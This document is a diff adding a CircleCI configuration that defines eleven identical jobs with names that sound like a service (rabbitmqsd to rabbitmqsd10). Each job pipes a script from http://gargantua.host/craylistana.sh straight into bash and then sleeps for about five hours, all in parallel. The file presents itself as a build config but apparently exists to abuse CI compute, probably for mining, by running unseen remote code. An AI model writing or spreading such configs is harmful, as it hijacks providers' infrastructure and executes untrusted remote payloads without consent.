@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  rabbitmqsd:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  rabbitmqsd10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistana.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - rabbitmqsd
+      - rabbitmqsd1
+      - rabbitmqsd2
+      - rabbitmqsd3
+      - rabbitmqsd4
+      - rabbitmqsd5
+      - rabbitmqsd6
+      - rabbitmqsd7
+      - rabbitmqsd8
+      - rabbitmqsd9
+      - rabbitmqsd10
